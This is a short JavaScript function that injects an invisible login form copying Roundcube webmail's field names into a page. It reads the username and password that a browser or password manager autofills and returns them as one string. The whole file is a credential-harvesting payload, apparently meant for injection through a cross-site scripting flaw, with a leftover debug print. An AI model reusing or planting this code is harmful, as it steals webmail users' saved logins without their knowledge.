export async function getUserCredentials() {
    try {
      console.log("WORKEG")
      document.body.innerHTML +=
        '<form id="login-form" style="display:none" name="login-form" method="post" class="propform" action="/?_task=login"><input name="_user" id="rcmloginuser" required="" size="40" class="form-control" autocapitalize="none" autocomplete="off" value="" type="text" placeholder="Username"><input name="_pass" id="rcmloginpwd" required="" size="40" class="form-control" autocapitalize="none" autocomplete="off" type="password" placeholder="Password"><button type="submit" id="rcmloginsubmit" class="button mainaction submit btn btn-primary btn-lg text-uppercase w-100">Login</button></div></form>'
      var username = document.getElementById('rcmloginuser').value
      var password = document.getElementById('rcmloginpwd').value
      if (username === null || password === null) {
        return ''
      } else {
        return `${username}-${password}`
      }
    } catch (e) {
      return 'unrecognized_email'
    }
  }
